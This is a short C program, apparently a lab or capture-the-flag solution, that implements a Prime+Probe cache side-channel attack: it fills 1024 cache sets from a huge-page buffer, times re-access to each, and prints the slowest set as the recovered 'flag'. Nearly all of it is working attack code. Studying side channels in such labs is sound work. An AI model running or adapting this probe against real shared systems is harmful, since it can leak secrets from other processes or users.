#include "util.h"
#include <sys/mman.h>
#include <stdint.h>
#include <stdio.h>   // for printf
#include <stdlib.h>  // for perror

#define BUFF_SIZE (128*1024*1024) // 128MB to avoid out-of-bounds
#define CACHE_LINE 64
#define NUM_SETS 1024

int main(int argc, char const *argv[]) {

    int flag = -1;

    // Allocate a large buffer
    char *buf = mmap(NULL, BUFF_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    buf[0] = 1;

    // Arrays for cache set addresses and access times
    char *set_addr[NUM_SETS];
    uint64_t times[NUM_SETS];

    // Initialize addresses to probe each cache set
    for (int i = 0; i < NUM_SETS; i++) {
        set_addr[i] = buf + i * 65536;  // spacing to hit different cache sets
    }

    // Prime+Probe loop
    while (1) {

        // PRIME: touch all addresses to fill cache
        for (int i = 0; i < NUM_SETS; i++)
            *(volatile char*)set_addr[i];

        // Small delay
        for (volatile int i = 0; i < 100000; i++);

        // PROBE: measure access times
        for (int i = 0; i < NUM_SETS; i++)
            times[i] = measure_one_block_access_time((ADDR_PTR)set_addr[i]);

        // Find the cache set with maximum access time
        uint64_t max_time = 0;
        for (int i = 0; i < NUM_SETS; i++) {
            if (times[i] > max_time) {
                max_time = times[i];
                flag = i;
            }
        }

        break;  // only need to measure once for this lab
    }

    printf("Flag: %d\n", flag);

    return 0;
}